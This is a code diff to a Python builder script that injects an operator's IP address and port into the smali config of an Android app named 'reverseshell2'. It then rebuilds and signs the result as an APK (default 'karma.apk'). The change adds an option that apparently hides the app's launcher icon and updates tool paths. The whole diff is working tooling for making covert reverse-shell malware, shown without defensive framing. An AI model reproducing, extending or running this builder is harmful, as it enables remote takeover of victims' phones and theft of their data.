@@ -350,13 +350,14 @@ def connection_checker(socket,queue):
     return conn,addr
 
 
-def build(ip,port,output,ngrok=False,ng=None):
-    editor = "Compiled_apk_files"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
+def build(ip,port,output,ngrok=False,ng=None,icon=None):
+    editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
     try:
         file = open(editor,"r").readlines()
         #Very much uncertaninity but cant think any other way to do it xD
-        file[16]=file[16][:21]+"\""+ip+"\""+"\n"
-        file[21]=file[21][:21]+"\""+port+"\""+"\n"
+        file[18]=file[18][:21]+"\""+ip+"\""+"\n"
+        file[23]=file[23][:21]+"\""+port+"\""+"\n"
+        file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
         str_file="".join([str(elem) for elem in file])
         open(editor,"w").write(str_file)
     except Exception as e:
@@ -369,7 +370,7 @@ def build(ip,port,output,ngrok=False,ng=None):
     print(stdOutput("info")+"\033[0mGenerating APK")
     outFileName = output if output else "karma.apk"
     que = queue.Queue()
-    t = threading.Thread(target=executeCMD,args=["java -jar Jar_Files/apktool.jar b Compiled_apk_files  -o "+outFileName,que],)
+    t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
     t.start()
     while t.isAlive(): animate("Building APK ")
     t.join()
@@ -378,7 +379,7 @@ def build(ip,port,output,ngrok=False,ng=None):
     if not resOut.returncode:
         print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
         print(stdOutput("info")+"\033[0mSigning the apk")
-        t = threading.Thread(target=executeCMD,args=["java -jar Jar_Files/sign.jar "+outFileName+" --override",que],)
+        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar "+outFileName+" --override",que],)
         t.start()
         while t.isAlive(): animate("Signing Apk ")
         t.join()
